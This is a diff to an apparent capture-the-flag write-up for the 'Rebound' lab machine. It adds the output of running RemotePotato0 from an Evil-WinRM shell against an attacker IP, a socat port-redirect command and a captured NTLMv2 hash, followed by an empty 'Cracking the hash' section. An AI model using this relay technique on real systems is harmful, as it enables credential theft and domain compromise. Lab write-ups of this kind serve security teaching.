@@ -377,5 +377,28 @@ This set a listener
 
 ```python
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./rp.exe -m 2 -s 1 -x 10.10.14.90 -p 8080
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8080
+[*] Example Network redirector:
+	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8080
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] RPC relay server listening on port 9997 ...
+[*] Starting RogueOxidResolver RPC Server listening on port 8080 ...
+[*] IStoragetrigger written: 104 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 8080
+[+] User hash stolen!
+
+NTLMv2 Client	: DC01
+NTLMv2 Username	: rebound\tbrady
+NTLMv2 Hash	: tbrady::rebound:fae89c03a043e494:160da51e07f0e6dc290592e10d3fbc56:01010000000000000f42025c83c4dc01d031e3de6b8f911c0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008000f42025c83c4dc01060004000600000008003000300000000000000001000000002000003dfc1385873951f06e0a31e26ef2fb991712d499dfcb8ff85ca6d452a9ead6370a00100000000000000000000000000000000000090000000000000000000000
 ```
-This ran the command 
+Ive got a hash!
+
+## Cracking the hash
+```python
+
+```
